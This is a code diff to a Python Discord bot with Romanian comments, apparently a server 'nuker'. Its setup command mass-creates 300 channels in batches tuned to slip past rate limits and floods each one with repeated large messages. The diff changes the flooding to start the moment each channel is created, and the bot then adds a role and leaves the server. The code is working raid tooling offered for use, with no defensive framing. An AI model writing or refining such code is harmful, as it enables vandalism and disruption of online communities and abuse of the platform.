@@ -323,12 +323,12 @@ async def setup(ctx):
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
 
-    # ===== CREARE 300 CANALE (batch 40) =====
+    # ===== CREARE 300 CANALE (batch 49) SI SPAM INAINTE DE FINALIZARE =====
     total_channels = 300
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale cu spam instant...")
 
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
@@ -343,38 +343,8 @@ async def setup(ctx):
         except:
             pass
 
-    async def create_channel(index):
-        try:
-            base_name = random.choice(base_channel_names)
-            font_style = random.choice(font_styles)
-            styled_name = apply_font(base_name, font_style)
-            if len(styled_name) > 100:
-                styled_name = base_name
-            ch = await guild.create_text_channel(name=styled_name)
-            created_channels.append(ch)
-            await send_initial_messages(ch)
-        except discord.HTTPException as e:
-            if e.status == 429:
-                await user.send(f"⚠️ Rate limit la canalul {index}, continui...")
-            else:
-                await user.send(f"⚠️ Eroare canal {index}: {e}")
-        except Exception as e:
-            await user.send(f"⚠️ Eroare canal {index}: {e}")
-
-    batch_size = 40
-    pause_between_batches = 0.05
-
-    for i in range(0, total_channels, batch_size):
-        batch = [create_channel(i+j) for j in range(batch_size) if i+j < total_channels]
-        await asyncio.gather(*batch)
-        await asyncio.sleep(pause_between_batches)
-
-    await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create!")
-
-    # ===== SPAM FINAL PE TOATE CANALELE SIMULTAN =====
-    await user.send("🔄 Începe spam-ul final pe toate canalele simultan...")
-
     async def spam_final(channel):
+        """Spam continuu pe un canal – pornește imediat după creare"""
         try:
             await channel.send(content=big_message)
             await asyncio.sleep(0.08)
@@ -386,14 +356,47 @@ async def setup(ctx):
                 await channel.send(content=msg)
                 await asyncio.sleep(0.06)
         except Exception:
-            # Orice eroare (inclusiv rate-limit) oprește doar acest task, nu pe celelalte
             pass
 
-    # Lansează toate task-urile simultan, fără semafor
-    spam_tasks = [spam_final(ch) for ch in created_channels]
-    await asyncio.gather(*spam_tasks, return_exceptions=True)
+    async def create_channel(index):
+        try:
+            base_name = random.choice(base_channel_names)
+            font_style = random.choice(font_styles)
+            styled_name = apply_font(base_name, font_style)
+            if len(styled_name) > 100:
+                styled_name = base_name
+            ch = await guild.create_text_channel(name=styled_name)
+            created_channels.append(ch)
 
-    await user.send("✅ Spam final complet. Părăsesc serverul...")
+            # trimite cele 2 mesaje inițiale
+            await send_initial_messages(ch)
+
+            # pornește spam-ul final în fundal, fără să aștepte
+            asyncio.create_task(spam_final(ch))
+
+        except discord.HTTPException as e:
+            if e.status == 429:
+                await user.send(f"⚠️ Rate limit la canalul {index}, continui...")
+            else:
+                await user.send(f"⚠️ Eroare canal {index}: {e}")
+        except Exception as e:
+            await user.send(f"⚠️ Eroare canal {index}: {e}")
+
+    # ===== BATCH 49, PAUZĂ 0.05 =====
+    batch_size = 49
+    pause_between_batches = 0.05
+
+    for i in range(0, total_channels, batch_size):
+        batch = [create_channel(i+j) for j in range(batch_size) if i+j < total_channels]
+        await asyncio.gather(*batch)
+        await asyncio.sleep(pause_between_batches)
+
+    await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create, spam-ul rulează deja pe toate!")
+
+    # Așteptăm puțin pentru ca spam-ul să ruleze (dar nu blocăm prea mult)
+    await asyncio.sleep(3)
+
+    await user.send("✅ Proces finalizat. Părăsesc serverul...")
 
     try:
         await guild.create_role(name="1weeksober-on-top")
